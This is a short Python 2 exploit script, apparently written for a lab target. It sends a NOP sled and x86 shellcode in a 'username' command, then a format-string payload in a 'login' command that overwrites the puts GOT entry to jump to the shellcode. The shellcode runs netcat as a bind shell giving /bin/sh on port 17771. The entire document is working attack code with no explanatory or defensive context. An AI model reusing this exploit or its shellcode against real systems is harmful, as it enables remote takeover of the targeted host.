import struct
import socket

HOST='10.0.1.132'
PORT=2994
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
put_got=0x0804a194
put_got2=put_got+2

shellcode_addr=0x804a220

nops="\x90"*10
shellcode="\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
#payload="AAAAA"+struct.pack("I",put_got)+"%x"*36+"%hn"
payload="AAAAA"+struct.pack("I",put_got)+"%41380d"+"%37$hn"
s.connect((HOST,PORT))
print s.recv(1024)
s.send("username "+nops+shellcode+"\n")
print s.recv(1024)
s.send("login "+payload+"\n")
print "[*]exploiting"
print "[*]This shellcode will listen on port 17771 and give you /bin/sh"
#print s.recv(1024)
s.close()

